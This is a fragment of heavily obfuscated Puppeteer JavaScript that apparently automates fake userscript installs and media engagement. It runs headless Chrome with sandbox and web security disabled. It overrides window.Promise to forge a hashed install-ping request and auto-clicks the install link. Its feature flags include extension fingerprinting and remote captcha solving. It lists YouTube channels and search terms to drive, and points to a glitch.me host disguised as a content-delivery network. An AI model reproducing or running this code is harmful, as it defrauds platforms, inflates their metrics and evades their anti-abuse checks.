                J[0x1672 + 0x19fb * -0x1 + -0x3 * -0x133] = this['block'], J[K >> -0x63b * -0x1 + 0x250a + -0x2b43] |= x[0xda9 * -0x1 + 0x1 * 0x2b4 + -0x18 * -0x75 & K], this['block'] = J[0xbf2 * -0x1 + -0x4f * 0x14 + 0x122e], K >= -0x2604 + -0x7da + 0x2e16 && (this['hashed'] || this['hash'](), J[-0xb29 * -0x3 + -0xfef + -0x118c] = this['block'], J[-0x1ea7 + -0x1 * -0x117 + 0x1 * 0x1da0] = J[0x85c + -0xca2 + -0x447 * -0x1] = J[-0xc * -0x2ec + -0x10 + 0x2 * -0x117f] = J[0x1ddf * -0x1 + -0x1596 + 0x3378] = J[0x1222 + -0xc * -0x287 + -0x1 * 0x3072] = J[-0x22a4 + 0x2087 + 0x222] = J[0x31 * 0x14 + -0x884 + 0x12 * 0x43] = J[0xb5 * 0x22 + 0x16ae + -0x2eb1] = J[0x255e + -0x14c6 + -0x1090] = J[0x1b4d + -0x10c3 + -0xa81] = J[-0x1ca7 + -0x22df + 0x3f90] = J[-0x2493 + 0x246f + 0x2f] = J[0x1d9 + -0x68b * -0x1 + 0x4 * -0x216] = J[0x641 + -0x11e9 + 0xbb5] = J[0x10 * 0x19c + -0x8f4 * -0x2 + 0x1 * -0x2b9a] = J[-0xdd3 + -0xef0 + 0x1cd2] = -0x3 * -0x314 + -0xae5 + 0x1a9 * 0x1), J[-0x11 * 0x1ad + -0x2283 + 0x2 * 0x1f87] = this['hBytes'] << 0x2 * -0x102f + -0x7 * 0xd5 + 0x6 * 0x65e | this['bytes'] >>> 0x37 * -0x53 + 0x88 * 0x3e + -0xefe, J[-0x1f * 0x9 + 0x5f3 * -0x1 + 0x719] = this['bytes'] << 0x365 * -0xb + 0x17d1 + -0x13b * -0xb, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x1fc3 + -0x1668 + 0x363b; J < 0x6e * -0x48 + -0x2b * 0x4f + 0x2c85 * 0x1; ++J)
                K = Q[J - (-0x3c3 + 0x97 * -0x25 + 0x1 * 0x1999)] ^ Q[J - (-0xe67 * -0x1 + 0x3b9 * -0x5 + 0x43e)] ^ Q[J - (0xe * 0x4f + 0x2 * 0x7b + -0x53a)] ^ Q[J - (-0x1 * -0xa99 + 0xadc + -0x1565)], Q[J] = K << -0x5 * 0x3b9 + 0x9d * -0x1a + -0x1 * -0x2290 | K >>> -0x1 * 0x1f6a + -0x2b0 * 0xb + 0x3d19 * 0x1;
              for (J = -0x2b * -0xb3 + -0x1f99 * -0x1 + -0x3daa; J < -0x218 * -0x9 + 0x3 * -0x305 + 0x23 * -0x47; J += 0x5f3 * -0x4 + 0x1fd4 + -0x803)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x18ba + -0x1209 * -0x1 + 0x1 * 0x6b6 | L >>> -0x8ac + -0x1 * -0x111f + 0xb2 * -0xc) + (M & N | ~M & O) + P + (-0xabcf6d * 0x108 + 0x5 * -0xae14203 + 0x14216ac10) + Q[J] << 0x88c * -0x1 + -0xd31 + 0x15bd) << 0x1098 + -0x12c1 + 0x2 * 0x117 | P >>> 0x466 * -0x1 + -0x1 * -0xbce + -0x74d) + (L & (M = M << -0x1f09 + 0x2 * -0x723 + 0x2d6d | M >>> 0xcb8 + -0x203 + -0xab3) | ~L & N) + O + (0x30a80655 + 0x9008af58 + -0x662e3c14) + Q[J + (-0x223e + 0x2480 + -0x241 * 0x1)] << 0x2 * 0xc93 + -0xee1 + -0xa45) << -0x67f * 0x1 + -0x13d9 + -0x11 * -0x18d | O >>> 0x76d + -0x218d + 0x1a3b) + (P & (L = L << 0x10da + -0x2557 + 0x149b | L >>> -0x2 * 0xddf + 0x14 * -0x197 + -0xee3 * -0x4) | ~P & M) + N + (-0x24db7544 + 0x8e9 * 0x1aae2 + 0x7082572b) + Q[J + (-0xc72 + 0x3d * -0x1f + -0x3 * -0x69d)] << 0xb * 0xda + -0x1279 + 0x91b) << -0x47 * -0x87 + 0x5 * 0x95 + -0x127 * 0x23 | N >>> -0x123f + 0x17ee + -0x594) + (O & (P = P << -0x57d * -0x1 + 0x152c + -0x1a8b | P >>> -0x510 + -0xb86 + -0x3b * -0x48) | ~O & L) + M + (0x6e221b7d * -0x1 + 0x6f1e9402 + -0x5a3a76 * -0xfe) + Q[J + (0x1cf2 * -0x1 + -0x2265 + 0x3f5a)] << 0x14e5 * 0x1 + 0xd2b * 0x1 + -0x2210) << 0x12a1 * -0x1 + 0x2486 + -0x11e0 | M >>> -0x398 + 0xef7 + -0xb44) + (N & (O = O << 0x169 * -0xb + -0x217c + -0x575 * -0x9 | O >>> 0x2099 + 0x1cf3 + 0x3d8a * -0x1) | ~N & P) + L + (-0x62e * -0x32bb4 + 0x4547b00f + -0x2e8622 * -0x9) + Q[J + (-0x3 * 0x97b + -0x245e + -0x1 * -0x40d3)] << 0xa9e + 0x2456 + -0x2ef4, N = N << 0x6df + 0x2551 + -0x2c12 | N >>> 0x168e + 0xa79 + 0x6b * -0x4f;
              for (; J < 0x2 * -0x884 + -0x7d * 0x21 + 0x214d; J += -0x171f + 0x18ed + -0x1 * 0x1c9)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x244b + -0x2 * -0x49d + -0xd0 * 0x38 | L >>> 0x19 * -0xd7 + -0x2401 + 0x391b * 0x1) + (M ^ N ^ O) + P + (-0x4438bf7a + -0x2 * -0x5e6cbde8 + 0x2f * -0x35405b) + Q[J] << 0xc9 * 0xd + -0x382 * 0x4 + -0x1 * -0x3d3) << -0xa9 * -0x3 + 0x252c + -0x2722 | P >>> 0x1d0a + -0x1 * -0x1733 + -0x3422) + (L ^ (M = M << -0x11 * 0x5b + -0xc61 + 0x2a * 0x71 | M >>> -0xb * 0xa9 + -0x23a7 + 0x2aec) ^ N) + O + (-0x78a96768 * 0x1 + -0x2224ec83 + 0x13ddc * 0xd5f5) + Q[J + (-0x1 * 0x1495 + -0x1c19 + -0x30af * -0x1)] << 0x1459 * -0x1 + 0xdd8 + 0x681 * 0x1) << -0x5ea * 0x6 + -0x6a8 + 0x2b * 0xfb | O >>> 0xec6 + -0x251d + 0x1a * 0xdd) + (P ^ (L = L << -0x1a3 * 0x12 + 0x22cb + 0x59 * -0xf | L >>> -0x69d * -0x1 + -0x8 * 0x262 + 0xc75) ^ M) + N + (-0xe88 * -0xbdc9b + 0x1 * -0x22c28cab + 0x26ea7a4 * -0xb) + Q[J + (-0x25dd + -0x1f5a * -0x1 + 0x685)] << 0x20fc + 0x244b + -0x4547) << 0x61 * -0x4 + 0x11 * 0x143 + -0x13ea | N >>> 0xb92 * 0x3 + 0x17 * -0xba + -0x3 * 0x5f7) + (O ^ (P = P << -0xdcc + -0x16 * 0x11e + 0x1 * 0x267e | P >>> -0x2 * 0x61 + 0x10c8 + -0x19a * 0xa) ^ L) + M + (0x771c9b4c + -0x425cef7d + -0xce3a9 * -0x482) + Q[J + (0xa47 * 0x1 + 0x19 * 0x91 + -0x186d)] << 0x20b2 + 0x257 + -0x2309) << -0x1 * 0x30a + 0x1b * 0x128 + 0x1 * -0x1c29 | M >>> -0x11 * 0x130 + -0xe03 + 0x1 * 0x224e) + (N ^ (O = O << -0x1283 + 0x6df + 0xe * 0xd7 | O >>> 0xf14 + 0x1610 + -0x61 * 0x62) ^ P) + L + (-0x2 * -0x787acd0 + 0x1a7136fa * -0x1 + 0x7a3bc8fb) + Q[J + (0xc6f + -0x6d7 + -0x594)] << -0x1187 + -0x3 * 0x16 + 0x11c9, N = N << 0xcfb + 0x164c + 0x2329 * -0x1 | N >>> -0x43f + 0xd7e + -0x93d;
              for (; J < -0xa40 + 0xc2 * -0x19 + -0xeb7 * -0x2; J += -0x192f + 0x19bd + -0x89)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1e25 + -0x497 + 0x1 * -0x1989 | L >>> 0x26d1 + 0x24ed + -0x43 * 0x121) + (M & N | M & O | N & O) + P - (0x31037c53 * 0x2 + -0x6ebcd149 + -0x7d9a1bc7 * -0x1) + Q[J] << -0x2295 + 0x5f0 + -0x1ca5 * -0x1) << -0x24a3 + 0x107e * -0x1 + 0x3526 | P >>> -0x1 * -0x1587 + -0x1 * -0x291 + -0x17fd) + (L & (M = M << 0x202e * 0x1 + 0x4be * 0x4 + 0x661 * -0x8 | M >>> -0xcbd + -0x17 * 0x17 + 0xed0) | L & N | M & N) + O - (0x3eab5bb8 + -0xc7abbf66 + 0xf9e4a6d2) + Q[J + (0x1 * -0x61f + -0x57 * 0x9 + 0x92f)] << -0x1 * 0x72b + -0x1779 * 0x1 + 0x1ea4) << -0x1 * 0xa2d + 0x1fcf * -0x1 + 0x2a01 * 0x1 | O >>> -0xf5 + 0x22af + 0x3 * -0xb35) + (P & (L = L << 0x5 * -0x417 + 0x7ff + -0x1 * -0xc92 | L >>> 0x26b4 + -0xe62 + -0x1850) | P & M | L & M) + N - (0x2863187e + 0x1 * -0x4f2913a3 + 0x5a1587 * 0x1af) + Q[J + (-0x4 * -0x95 + -0x11b * -0x22 + -0x27e8)] << 0x21 * 0xbf + -0x2e9 + -0x15b6) << 0x1fa1 + -0xeb9 * -0x2 + -0x61b * 0xa | N >>> -0x1e88 + 0x1 * 0x192d + 0x576) + (O & (P = P << -0x12f7 + 0x30e * 0xc + -0x1193 | P >>> -0x24f8 + 0xe6 + 0x1 * 0x2414) | O & L | P & L) + M - (-0x8f1e0477 + -0x5f08f94d + 0x15f0b40e8) + Q[J + (-0x1341 + -0x533 + 0x1877)] << -0x1c9a + 0x1 * -0x71f + 0x23b9) << -0x17f9 + -0x1f5 * 0x9 + -0x299b * -0x1 | M >>> -0x947 + -0x1 * 0x110b + 0xf * 0x1c3) + (N & (O = O << -0x4 * 0x2e4 + 0xcf * 0x26 + -0x1 * 0x130c | O >>> -0x14da + 0x862 * -0x3 + -0x7ab * -0x6) | N & P | O & P) + L - (0x8b16c637 * -0x1 + -0xd5a976b2 + 0x7a22c11 * 0x3d) + Q[J + (0x1 * -0x96d + 0x1db2 + -0x1441)] << 0xc62 + 0x1 * 0x2554 + -0x31b6, N = N << -0x563 + 0x15a * -0x3 + 0x98f * 0x1 | N >>> -0xc7a + -0xaf4 * -0x3 + -0xa3 * 0x20;
              for (; J < 0x4e1 + -0xb * -0x1d + -0x30 * 0x1f; J += -0x57d + -0x1 * 0x551 + 0xad3)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x47 * 0x5d + -0xc05 + -0x7 * 0x1f7 | L >>> 0x482 + -0x1 * -0x14ab + -0xc89 * 0x2) + (M ^ N ^ O) + P - (-0x67 * -0x1ccaae + 0xf9e8cd7 + -0x1f1cd * -0xd95) + Q[J] << -0x3e * -0x89 + -0x2 * 0x66e + -0x9 * 0x242) << -0x15d2 + 0x2025 + -0xa4e * 0x1 | P >>> 0x14b5 + -0x5a0 + -0xefa) + (L ^ (M = M << 0x1 * -0x2028 + -0x290 + 0x22d6 | M >>> -0x6c3 * -0x1 + -0x19b5 + -0x1 * -0x12f4) ^ N) + O - (-0xd * -0x7af0939 + -0x3fce7182 + 0x118837c7) + Q[J + (-0x1d68 + -0x13ce + 0x3137)] << -0x4 * -0x905 + 0x9e * -0x23 + -0xe7a) << -0x69f + 0x2 * -0x1119 + -0x28d6 * -0x1 | O >>> -0x1645 + 0x545 * -0x1 + 0x937 * 0x3) + (P ^ (L = L << 0x37e * 0x1 + 0xab2 + -0xe12 | L >>> 0x277 * -0x9 + -0x65d * 0x1 + 0x1c8e) ^ M) + N - (-0x2110cf33 + -0x11e29a42 + -0x1 * -0x6890a79f) + Q[J + (0x2467 + 0x1619 + -0x2 * 0x1d3f)] << -0x2021 + 0x2358 * 0x1 + -0x337) << 0x11c2 + -0xd19 + -0x4a4 | N >>> 0x9 * 0x6f + 0x92c * -0x1 + 0x560) + (O ^ (P = P << 0xc49 + -0xfe + 0x1 * -0xb2d | P >>> 0x1 * 0x1be + 0xe23 * -0x1 + -0x5 * -0x27b) ^ L) + M - (0x543 * -0x11c5bf + -0x496db * -0x87d + 0x6c2c3938) + Q[J + (-0x20d5 + 0x1e2d + 0x2ab * 0x1)] << -0x47f + 0x223 * -0x11 + 0xd1 * 0x32) << -0x1c8e + -0xb3c + -0xd45 * -0x3 | M >>> -0x2 * 0x5b7 + -0x1 * -0x18a7 + -0xd1e) + (N ^ (O = O << -0x23f3 * -0x1 + -0x5 * 0x4cd + -0xbd4 | O >>> 0x2197 + -0x124f * 0x1 + -0x1 * 0xf46) ^ P) + L - (0xc80ba7 + -0x10400f * 0x95 + 0x3e4a7b3e) + Q[J + (-0x1561 + 0x23e0 + -0xe7b)] << 0x2af * -0x9 + 0x1f * -0x5c + 0x234b, N = N << 0xa6 * 0x2e + -0x152b + -0x51 * 0x1b | N >>> 0x1b20 + 0x10eb + 0x2c09 * -0x1;
              this['h0'] = this['h0'] + L << 0x3da * 0x3 + -0x138a * -0x1 + -0x1f18, this['h1'] = this['h1'] + M << 0x101a + 0xd2d + -0x1d47, this['h2'] = this['h2'] + N << -0xd63 * -0x1 + -0x201e + 0x12bb, this['h3'] = this['h3'] + O << -0x62b * 0x1 + 0x147 * -0x14 + 0x17 * 0x161, this['h4'] = this['h4'] + P << -0xbe7 + 0x94d * 0x1 + 0x1 * 0x29a;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x3d1 * -0x9 + 0x762 + 0x1b13 & 0x2 * 0x27c + -0xbc * -0x4 + -0x7d9] + w[J >> 0x1 * -0x19d1 + -0x72b + -0x845 * -0x4 & -0x22dc + 0x1 * 0xc85 + -0x5e * -0x3d] + w[J >> -0xe * -0x1ac + 0x10 * -0x130 + -0x454 & -0x1c2a + -0xb * 0x314 + 0x3e15] + w[J >> 0x76e + -0x45a * -0x7 + 0x975 * -0x4 & -0x1d * -0x55 + -0x1819 + 0xe87 * 0x1] + w[J >> 0xc8c + 0xbb1 * 0x3 + 0x281 * -0x13 & 0xaa0 + 0x9ac * -0x2 + -0x3 * -0x2ed] + w[J >> -0x2fc * -0x3 + 0x7c2 * 0x4 + -0x27f4 & -0x22 * -0x2b + 0x19f2 + 0x1f99 * -0x1] + w[J >> 0x18fe * -0x1 + -0x8d * 0xb + -0x3 * -0xa5b & 0x30 * 0x83 + 0x7 * -0x18d + -0xda6] + w[-0x1cb5 + 0x19e1 + 0x2e3 & J] + w[K >> 0x247b + -0x30 * 0x4e + -0x15bf & 0xdde + 0x2274 + 0x9a7 * -0x5] + w[K >> -0xd6 * 0x6 + -0x1 * 0x1b33 + 0x204f & 0xcf2 + -0x1435 * -0x1 + 0xc * -0x2c2] + w[K >> -0x7c3 * -0x1 + -0x523 * -0x2 + -0x11f5 & 0x4ab + 0x8 * 0x4d3 + -0x2b34] + w[K >> 0x1738 + 0xc5 * 0x1f + -0x2f03 & 0x124a + 0x673 + -0x18ae] + w[K >> 0x401 * 0x5 + 0x1a * 0x11b + -0x103d * 0x3 & 0x12ee * 0x2 + -0x1 * 0x13ac + -0x1221] + w[K >> -0xe7b + -0x22e6 + -0x5b * -0x8b & -0xa7e + 0x234c + -0x18bf] + w[K >> -0x1597 * 0x1 + 0x25 * 0x1 + 0xabb * 0x2 & 0x226d * -0x1 + 0x123b * -0x1 + -0x5 * -0xa8b] + w[-0xc * -0x11b + -0x25b6 + 0x1881 & K] + w[L >> -0x25d * -0xb + 0x3b3 * -0x1 + -0x1630 & -0x11a6 + 0x20e9 + 0x1 * -0xf34] + w[L >> 0xfb3 + 0x579 * -0x1 + -0xa22 & 0x1 * 0x21d + -0x1599 + 0x138b] + w[L >> 0x3 * 0x256 + -0xf15 + 0x827 & 0x1 * -0x1d41 + -0x19c7 + -0x9 * -0x61f] + w[L >> -0x26f * -0x3 + -0x13d * -0x3 + 0x1 * -0xaf4 & 0xd * 0x92 + -0x26d8 + -0x3 * -0xa7f] + w[L >> 0x2178 + 0x1c0c + -0x7 * 0x8c8 & 0xf00 + 0x53 * -0x9 + -0xc06] + w[L >> 0x26e1 + -0x4de + -0x1 * 0x21fb & 0x1 * -0x106c + 0x155b + -0x4e0] + w[L >> 0x10 * -0xbe + -0x12d * -0x2 + 0x98a & 0x4a * -0x1f + 0x3 * -0x337 + -0x2 * -0x955] + w[-0xf9a + -0x515 + -0xa * -0x213 & L] + w[M >> -0x2 * -0x227 + -0x2 * -0x1d + -0x46c * 0x1 & -0xa * 0x1d5 + 0x21a6 + -0xf45] + w[M >> -0x591 + -0x12db * -0x1 + -0xd32 & -0x1eb * 0xd + -0x892 * 0x1 + 0x2190 * 0x1] + w[M >> 0xf52 + -0x10fd * -0x1 + -0x203b & -0x1b79 + 0x198e + 0x1fa * 0x1] + w[M >> -0x18ae + 0x9f3 + 0x21d * 0x7 & -0x1f0b + 0x5 * -0x391 + 0x30ef] + w[M >> -0x1a4 + -0x26 * 0xe3 + 0x2 * 0x11b1 & 0x41 * -0x1f + -0x9e * 0x17 + 0x1620] + w[M >> 0x193d + -0xb3a * -0x1 + 0x3 * -0xc25 & -0x3 * -0x37f + -0x2465 + -0x1 * -0x19f7] + w[M >> -0x7b * -0x22 + 0x13c4 + -0x2416 & -0x1929 + 0x89a + 0x109e] + w[0x1 * -0x252e + -0x398 + -0x1 * -0x28d5 & M] + w[N >> -0x29a * -0xe + 0xd0f + -0x21 * 0x17f & 0xd44 + 0x3f1 * -0x2 + -0x553] + w[N >> -0x19a6 + -0x25e0 + 0x3f9e & -0x17 * -0x1af + -0x1 * -0x210e + 0x44 * -0x10e] + w[N >> 0x36 * -0x3 + -0x143 * -0x5 + -0x1 * 0x599 & 0x38f * 0x1 + 0xe3c * -0x1 + 0x55e * 0x2] + w[N >> -0x2 * -0xeb5 + 0x24f9 + 0x1 * -0x4253 & -0x14a0 + -0x10de + -0x258d * -0x1] + w[N >> -0xad9 * -0x1 + -0x2453 + 0x441 * 0x6 & -0xcfb * 0x2 + 0x19f5 + 0x10 * 0x1] + w[N >> -0x1ba2 + 0x8d2 + 0x12d8 & 0x1ad2 + -0x2515 + 0xa52] + w[N >> -0x13 * -0x192 + 0x5b9 + -0x238b & -0xdbb + 0x5d5 * 0x4 + -0x98a] + w[-0x3b * 0xa3 + 0xce0 + -0x2 * -0xc60 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x1186 + -0x41f + 0x15bd & -0x801 + -0x26b * 0x7 + 0x19ed,
                J >> -0x175 * 0x11 + -0x6 * 0x253 + 0x26c7 & -0xb * -0x2d4 + 0x696 + -0x24b3,
                J >> -0x1d14 + 0xb41 + 0x11db & 0x1 * -0xef9 + 0xa45 + 0x5b3,
                -0x1 * -0x1087 + 0x259f * -0x1 + -0x1b3 * -0xd & J,
                K >> -0x2543 + 0x2de * -0x1 + 0x2839 & 0x1460 + -0x76d + -0xbf4,
                K >> 0x1 * -0x3df + -0x1 * -0x2604 + -0x1 * 0x2215 & 0x255b + -0x2b + 0x73d * -0x5,
                K >> 0x19 * -0xf + -0x257a + 0x26f9 & -0x1b13 + -0x26e6 + -0x217c * -0x2,
                0xffc + 0x1 * -0x124d + -0x10 * -0x35 & K,
                L >> -0x1700 + 0xad * -0xe + 0x208e & 0x17bc * -0x1 + -0x4 * -0x1ad + 0x5 * 0x39b,
                L >> -0x21e5 * -0x1 + 0x19ce + -0x7 * 0x885 & 0xb47 + 0x1de * -0x4 + -0x2d0,
                L >> 0x186 * -0xa + -0x8 * -0x152 + 0x4b4 & -0x16a4 + -0x86a + 0x200d * 0x1,
                -0x674 + -0x6f7 * -0x2 + 0x229 * -0x3 & L,
                M >> -0x1490 + -0x287 * 0x9 + -0x29 * -0x10f & -0x2710 + 0x2126 + 0x1 * 0x6e9,
                M >> 0x180b + -0x87f * 0x1 + 0x4 * -0x3df & 0x128 * 0x10 + 0x3be + 0x25 * -0x93,
                M >> 0x5 * 0x4d6 + -0x13 * 0x1bf + 0x907 & -0x240c + 0x1 * -0xd29 + 0x3234,
                0x17aa * 0x1 + -0x1 * -0x1ec7 + -0x1 * 0x3572 & M,
                N >> 0x22 * -0x49 + -0xe * -0x189 + -0xbb4 & 0x83 * 0x26 + 0xd03 + -0xfbb * 0x2,
                N >> -0x2 * -0xa26 + -0x1aae + 0x672 & 0x205 * -0x12 + -0x186d + 0x3dc6,
                N >> -0xd37 + -0xc * -0x43 + 0xc7 * 0xd & -0xb6b * -0x1 + -0x1e13 + 0x13a7,
                0x12dd + -0x757 * 0x3 + 0x427 * 0x1 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x228 + 0x107 * 0x2 + 0x17 * 0x2), (K = new DataView(J))['setUint32'](0xf6b * -0x1 + 0xc8c + 0x2df, this['h0']), K['setUint32'](0x23a7 * -0x1 + -0xf96 + -0x3341 * -0x1, this['h1']), K['setUint32'](0xc9 * -0x21 + -0x331 * 0x5 + -0x1 * -0x29e6, this['h2']), K['setUint32'](-0x775 + -0x1104 + 0x1885 * 0x1, this['h3']), K['setUint32'](0x9 * -0x24b + 0x1 * 0x1ab9 + 0x3 * -0x202, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x3 * -0x6bf + 0xc51 * -0x1 + 0x1cf * 0x12];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x687 + 0x8e9 * 0x4 + 0x1 * -0x2a2b;
            J[0x1 * -0xb3f + 0x2446 + -0x1907]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x60 * 0x42 + 0x1471 + 0x44f] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x1 * -0xf67 + 0x1f6b + -0x2ed1), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x2f * -0x2f + 0x222f * -0x1 + 0x2d7 * 0x9;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x1c74 + 0x17e * 0xa + -0x2584), Promise['resolve'](0x30b * -0x6 + -0x3 * 0xcc7 + 0x713 * 0x8);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0xd59 * -0x2 + 0x22e8 + -0x836; j < 0x1fac + 0x4b + -0xffb * 0x2; j++)
    i();
}
const NETWORK_PATIENCE = -0xc * -0x525 + 0x2 * 0x1415 + -0x46a6 + (-0x3 * -0xc9d + -0x234 + -0x1d7 * 0xd) * Math[X(0x2)](),
  MM_NETWORK_PATIENCE = (-0x124b + 0x7fe + 0x21 * 0x50) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';

function a() {
  const bq = [
    'lCowlJiBa21zW5VcRq',
    'CI10yw1WzxjTBW',
    'random',
    '-adblock-v',
    'ChrZl2j5lxnPDa',
    'WONdS8ouW5O',
    'ing',
    'Ew91DhvIzs1WBW',
    'e8okW5i4mCk9e8oj',
    'resolve',
    'rg/scripts',
    'yflcKfiGWPiwWOXHiq',
    'y29Tl2nOyw5Uzq',
    'button\x20>\x20y',
    'gmoaW4/dMmk7W53cKLldLxG',
    'ChrZlZm3ndC5na',
    'ASoEW5tdKSkeumkSW5ddLgu',
    'y2XVC2u',
    'CMCVC2nYAxb0CW',
    'W6uhba3cQmoXWOlcSCo3WPG',
    'CMfUzg9TrMX1CW',
    'y29UC3rYDwn0BW',
    'WO3dK8kekSo5W4C',
    'iM3cKSkWWR/cNmoSWP4DWOq',
    'EeFcLLe2',
    'ECk4oYiHWQaIW7msWPC',
    'n/json',
    'CMCVzw4VC2nYAq',
    'Af9outn5mwvRoa'
  ];
  a = function() {
    return bq;
  };
  return a();
}
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + Y(0xc) + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x1e1 * 0x10 + -0xe32 + 0x2c42; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x160f + -0x2047 + 0x3656);
    let h = e[f];
    return h;
  }, d(b, c);
}
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + Z(0x13, '#ba3') + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 